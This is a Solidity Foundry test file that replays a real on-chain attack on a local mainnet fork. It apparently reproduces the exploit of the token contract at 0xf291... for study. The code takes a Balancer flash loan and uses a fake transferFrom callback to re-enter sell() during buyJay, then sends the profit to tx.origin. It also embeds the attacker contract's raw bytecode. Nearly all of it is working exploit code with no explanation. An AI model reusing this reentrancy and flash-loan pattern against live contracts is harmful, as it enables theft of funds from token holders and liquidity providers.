// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6
// https://etherscan.io/address/0x0348D20b74Ddc0ac9bfC3626e06d30bb6Fac213b

interface I {
    function sell(uint256) external payable;
    function buyJay(address[] memory, uint256[] memory, address[] memory, uint256[] memory, uint256[] memory)
        external
        payable;
    function deposit() external payable;
    function balanceOf(address) external payable returns (uint256);
    function withdraw(uint256) external payable;
    function transfer(address, uint256) external payable;
    function flashLoan(address, address[] memory, uint256[] memory, bytes memory) external payable;
}

contract Xed42 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6");
    }

    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xf291 = 0xf2919D1D80Aff2940274014bef534f7791906FF2;

    uint256 t_transferFrom = 0;

    function test1() public {
        // vm.startPrank(0x0348D20b74Ddc0ac9bfC3626e06d30bb6Fac213b, 0x0348D20b74Ddc0ac9bfC3626e06d30bb6Fac213b);

        vm.createSelectFork("http://localhost:18545", 16288199); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xce5e23f35193c8a2f02243a530c39dbdd60bcf6ea35b291590e3814e0c293cc9));

        // https://explorer.phalcon.xyz/tx/eth/0xce5e23f35193c8a2f02243a530c39dbdd60bcf6ea35b291590e3814e0c293cc9
        this.xce5e23f3();
        // https://explorer.phalcon.xyz/tx/eth/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6
        xfc42acfb();
    }

    function test2() public {
        // vm.startPrank(0x0348D20b74Ddc0ac9bfC3626e06d30bb6Fac213b, 0x0348D20b74Ddc0ac9bfC3626e06d30bb6Fac213b);

        vm.createSelectFork("http://localhost:18545", 16288185); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xce5e23f35193c8a2f02243a530c39dbdd60bcf6ea35b291590e3814e0c293cc9
        this.xce5e23f3();
        vm.warp(1672290143);
        vm.roll(16288199);
        // https://explorer.phalcon.xyz/tx/eth/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6
        xfc42acfb();
    }

    function xce5e23f3() public {
        _constructor_();
    }

    function xfc42acfb() public {
        address[] memory arr01 = new address[](1);
        arr01[0] = xc02a;
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 72500000000000000000;
        bytes memory b01 =
            abi.encode(22000000000000000000, 50500000000000000000, 3500000000000000000, 8000000000000000000);
        I(xba12).flashLoan(r, arr01, arr02, b01);

        address(tx.origin).call{value: 15324469731061671907}("");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
        I(xc02a).withdraw(72500000000000000000);

        address[] memory arr06 = new address[](0);
        uint256[] memory arr07 = new uint256[](0);
        address[] memory arr08 = new address[](0);
        uint256[] memory arr09 = new uint256[](0);
        uint256[] memory arr10 = new uint256[](0);
        I(xf291).buyJay{value: 22000000000000000000}(arr06, arr07, arr08, arr09, arr10);

        address[] memory arr11 = new address[](1);
        arr11[0] = r;
        uint256[] memory arr12 = new uint256[](1);
        arr12[0] = 0;
        address[] memory arr13 = new address[](0);
        uint256[] memory arr14 = new uint256[](0);
        uint256[] memory arr15 = new uint256[](0);
        I(xf291).buyJay{value: 50500000000000000000}(arr11, arr12, arr13, arr14, arr15);

        // uint256 v1 = 4313025058290613910965927;
        uint256 v1 = I(xf291).balanceOf(r);
        console2.log("I(xf291).balanceOf(r)\t\t->", "4313025058290613910965927 (4313025.5829 ether)");
        I(xf291).sell(v1);

        address[] memory arr16 = new address[](0);
        uint256[] memory arr17 = new uint256[](0);
        address[] memory arr18 = new address[](0);
        uint256[] memory arr19 = new uint256[](0);
        uint256[] memory arr20 = new uint256[](0);
        I(xf291).buyJay{value: 3500000000000000000}(arr16, arr17, arr18, arr19, arr20);

        address[] memory arr21 = new address[](1);
        arr21[0] = r;
        uint256[] memory arr22 = new uint256[](1);
        arr22[0] = 0;
        address[] memory arr23 = new address[](0);
        uint256[] memory arr24 = new uint256[](0);
        uint256[] memory arr25 = new uint256[](0);
        I(xf291).buyJay{value: 8000000000000000000}(arr21, arr22, arr23, arr24, arr25);

        // uint256 v2 = 578675968434609156630781;
        uint256 v2 = I(xf291).balanceOf(r);
        console2.log("I(xf291).balanceOf(r)\t\t->", "578675968434609156630781 (578675.9684 ether)");
        I(xf291).sell(v2);
        I(xc02a).deposit{value: 72500000000000000000}();
        I(xc02a).transfer(xba12, 72500000000000000000);
    }

    function call() public payable {}

    function transferFrom(address, address, uint256) public {
        t_transferFrom++;

        if (t_transferFrom == 1) {
            // uint256 v1 = 13584899853779845952188;
            uint256 v1 = I(xf291).balanceOf(r);
            console2.log("I(xf291).balanceOf(r)\t\t->", "13584899853779845952188 (13584.8998 ether)");
            I(xf291).sell(v1);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_transferFrom == 2) {
            // uint256 v1 = 13221999944300134342235;
            uint256 v1 = I(xf291).balanceOf(r);
            console2.log("I(xf291).balanceOf(r)\t\t->", "13221999944300134342235 (13221.9999 ether)");
            I(xf291).sell(v1);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function _constructor_() public {
        bytes memory rt = abi.encodePacked(
            hex"6080604052600436106100345760003560e01c806323b872dd14610056578063",
            hex"f04f27071461008a578063fc42acfb1461009d575b32730348d20b74ddc0ac9b",
            hex"fc3626e06d30bb6fac213b1461005457600080fd5b005b348015610062576000",
            hex"80fd5b50610076610071366004610bec565b6100b0565b604051901515815260",
            hex"200160405180910390f35b610054610098366004610cb6565b6102c7565b6100",
            hex"546100ab366004610d7a565b6109de565b600032730348d20b74ddc0ac9bfc36",
            hex"26e06d30bb6fac213b146100d257600080fd5b60408051600180825281830190",
            hex"9252600091602080830190803683370190505090503081600081518110610108",
            hex"57610108610dd4565b73ffffffffffffffffffffffffffffffffffffffff9290",
            hex"9216602092830291909101909101526040805160018082528183019092526000",
            hex"9181602001602082028036833701905050905060008160008151811061016757",
            hex"610167610dd4565b602090810291909101810191909152604080516000808252",
            hex"8184018181528284018281526060840180865283547f70a08231000000000000",
            hex"0000000000000000000000000000000000000000000090915230606486015294",
            hex"5193959194909373ffffffffffffffffffffffffffffffffffffffff90911691",
            hex"6370a08231916084808901929190818a030181865afa158015610206573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"9061022a9190610e03565b905080156102b7576000546040517fe4849b320000",
            hex"0000000000000000000000000000000000000000000000000000815260048101",
            hex"83905273ffffffffffffffffffffffffffffffffffffffff9091169063e4849b",
            hex"3290602401600060405180830381600087803b15801561029e57600080fd5b50",
            hex"5af11580156102b2573d6000803e3d6000fd5b505050505b5060019998505050",
            hex"505050505050565b32730348d20b74ddc0ac9bfc3626e06d30bb6fac213b1461",
            hex"02e757600080fd5b6000868660008181106102fc576102fc610dd4565b604051",
            hex"7f2e1a7d4d000000000000000000000000000000000000000000000000000000",
            hex"0081526020909102929092013560048301819052925073c02aaa39b223fe8d0a",
            hex"0e5c4f27ead9083c756cc291632e1a7d4d915060240160006040518083038160",
            hex"0087803b15801561036f57600080fd5b505af1158015610383573d6000803e3d",
            hex"6000fd5b50505050600080600080868681019061039c9190610e1c565b604080",
            hex"5160008082526020820181815282840182815260608401838152608085018481",
            hex"5260a086019687905293547f666566e800000000000000000000000000000000",
            abi.encode(address(0x909652989C50969A509498509296509492939291)),
            hex"9073ffffffffffffffffffffffffffffffffffffffff1663666566e88a61042d",
            hex"888888888860a48501610ecf565b6000604051808303818588803b1580156104",
            hex"4657600080fd5b505af115801561045a573d6000803e3d6000fd5b5060009350",
            hex"6001925061046b915050565b6040519080825280602002602001820160405280",
            hex"15610494578160200160208202803683370190505b5090503081600081518110",
            hex"6104ab576104ab610dd4565b73ffffffffffffffffffffffffffffffffffffff",
            hex"ff92909216602092830291909101909101526040805160018082528183019092",
            hex"5260009181602001602082028036833701905050905060008160008151811061",
            hex"050a5761050a610dd4565b60209081029190910101526000546040517f666566",
            hex"e800000000000000000000000000000000000000000000000000000000815273",
            hex"ffffffffffffffffffffffffffffffffffffffff9091169063666566e8908c90",
            hex"61057590869086908b908b908b90600401610ecf565b60006040518083038185",
            hex"88803b15801561058e57600080fd5b505af11580156105a2573d6000803e3d60",
            hex"00fd5b50506000546040517f70a0823100000000000000000000000000000000",
            abi.encode(address(0x815230600482015273fffFFFFfFFfFFFFfFfFfff)),
            hex"ffffffffffffffffff909116935063e4849b3292508391506370a08231906024",
            hex"01602060405180830381865afa15801561061d573d6000803e3d6000fd5b5050",
            hex"50506040513d601f19601f820116820180604052508101906106419190610e03",
            hex"565b6040518263ffffffff1660e01b815260040161065f91815260200190565b",
            hex"600060405180830381600087803b15801561067957600080fd5b505af1158015",
            hex"61068d573d6000803e3d6000fd5b50506000546040517f666566e80000000000",
            hex"0000000000000000000000000000000000000000000000815273ffffffffffff",
            hex"ffffffffffffffffffffffffffff909116925063666566e891508b906106f190",
            hex"8b908b908b908b908b90600401610ecf565b6000604051808303818588803b15",
            hex"801561070a57600080fd5b505af115801561071e573d6000803e3d6000fd5b50",
            hex"506000546040517f666566e80000000000000000000000000000000000000000",
            hex"0000000000000000815273ffffffffffffffffffffffffffffffffffffffff90",
            hex"9116935063666566e892508b915061078390869086908b908b908b9060040161",
            hex"0ecf565b6000604051808303818588803b15801561079c57600080fd5b505af1",
            hex"1580156107b0573d6000803e3d6000fd5b50506000546040517f70a082310000",
            hex"0000000000000000000000000000000000000000000000000000815230600482",
            hex"015273ffffffffffffffffffffffffffffffffffffffff909116935063e4849b",
            hex"3292508391506370a0823190602401602060405180830381865afa1580156108",
            hex"2b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060",
            hex"40525081019061084f9190610e03565b6040518263ffffffff1660e01b815260",
            hex"040161086d91815260200190565b600060405180830381600087803b15801561",
            hex"088757600080fd5b505af115801561089b573d6000803e3d6000fd5b50505050",
            hex"73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffff",
            hex"ffffffffffffffffffff1663d0e30db08d6040518263ffffffff1660e01b8152",
            hex"6004016000604051808303818588803b1580156108fb57600080fd5b505af115",
            hex"801561090f573d6000803e3d6000fd5b505050505073c02aaa39b223fe8d0a0e",
            hex"5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff16",
            hex"63a9059cbb338e6040518363ffffffff1660e01b815260040161098492919073",
            hex"ffffffffffffffffffffffffffffffffffffffff929092168252602082015260",
            hex"400190565b6020604051808303816000875af11580156109a3573d6000803e3d",
            hex"6000fd5b505050506040513d601f19601f820116820180604052508101906109",
            hex"c79190610f3c565b505050505050505050505050505050505050505050565b33",
            hex"730348d20b74ddc0ac9bfc3626e06d30bb6fac213b146109fe57600080fd5b60",
            hex"0080547fffffffffffffffffffffffff00000000000000000000000000000000",
            hex"000000001673ffffffffffffffffffffffffffffffffffffffff851617815560",
            hex"4080516001808252818301909252906020808301908036833701905050905073",
            hex"c02aaa39b223fe8d0a0e5c4f27ead9083c756cc281600081518110610a865761",
            hex"0a86610dd4565b73ffffffffffffffffffffffffffffffffffffffff92909216",
            hex"6020928302919091019091015260408051600180825281830190925260009181",
            hex"60200160208202803683370190505090508581600081518110610ae457610ae4",
            hex"610dd4565b60209081029190910101526040517f5c38449e0000000000000000",
            hex"0000000000000000000000000000000000000000815273ba12222222228d8ba4",
            hex"45958a75a0704d566bf2c890635c38449e90610b47903090869086908a908a90",
            hex"600401610f65565b600060405180830381600087803b158015610b6157600080",
            hex"fd5b505af1158015610b75573d6000803e3d6000fd5b5050604051730348d20b",
            hex"74ddc0ac9bfc3626e06d30bb6fac213b92504780156108fc0292509060008181",
            hex"81858888f19350505050158015610bba573d6000803e3d6000fd5b5050505050",
            hex"5050565b803573ffffffffffffffffffffffffffffffffffffffff8116811461",
            hex"0be757600080fd5b919050565b600080600060608486031215610c0157600080",
            hex"fd5b610c0a84610bc3565b9250610c1860208501610bc3565b91506040840135",
            hex"90509250925092565b60008083601f840112610c3a57600080fd5b50813567ff",
            hex"ffffffffffffff811115610c5257600080fd5b6020830191508360208260051b",
            hex"8501011115610c6d57600080fd5b9250929050565b60008083601f840112610c",
            hex"8657600080fd5b50813567ffffffffffffffff811115610c9e57600080fd5b60",
            hex"2083019150836020828501011115610c6d57600080fd5b600080600080600080",
            hex"6000806080898b031215610cd257600080fd5b883567ffffffffffffffff8082",
            hex"1115610cea57600080fd5b610cf68c838d01610c28565b909a50985060208b01",
            hex"35915080821115610d0f57600080fd5b610d1b8c838d01610c28565b90985096",
            hex"5060408b0135915080821115610d3457600080fd5b610d408c838d01610c2856",
            hex"5b909650945060608b0135915080821115610d5957600080fd5b50610d668b82",
            hex"8c01610c74565b999c989b5096995094979396929594505050565b6000806000",
            hex"8060608587031215610d9057600080fd5b84359350610da060208601610bc356",
            hex"5b9250604085013567ffffffffffffffff811115610dbc57600080fd5b610dc8",
            hex"87828801610c74565b95989497509550505050565b7f4e487b71000000000000",
            hex"0000000000000000000000000000000000000000000060005260326004526024",
            hex"6000fd5b600060208284031215610e1557600080fd5b5051919050565b600080",
            hex"60008060808587031215610e3257600080fd5b50508235946020840135945060",
            hex"40840135936060013592509050565b6000815180845260208085019450808401",
            hex"60005b83811015610e9457815173ffffffffffffffffffffffffffffffffffff",
            hex"ffff1687529582019590820190600101610e62565b509495945050505050565b",
            hex"600081518084526020808501945080840160005b83811015610e945781518752",
            hex"9582019590820190600101610eb3565b60a081526000610ee260a0830188610e",
            hex"4e565b8281036020840152610ef48188610e9f565b9050828103604084015261",
            hex"0f088187610e4e565b90508281036060840152610f1c8186610e9f565b905082",
            hex"81036080840152610f308185610e9f565b98975050505050505050565b600060",
            hex"208284031215610f4e57600080fd5b81518015158114610f5e57600080fd5b93",
            hex"92505050565b73ffffffffffffffffffffffffffffffffffffffff8616815260",
            hex"8060208201526000610f946080830187610e4e565b8281036040840152610fa6",
            hex"8187610e9f565b90508281036060840152838152838560208301376000602085",
            hex"8301015260207fffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffffffe0601f860116820101915050969550505050505056fea164736f",
            hex"6c6343000811000a"
        );
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
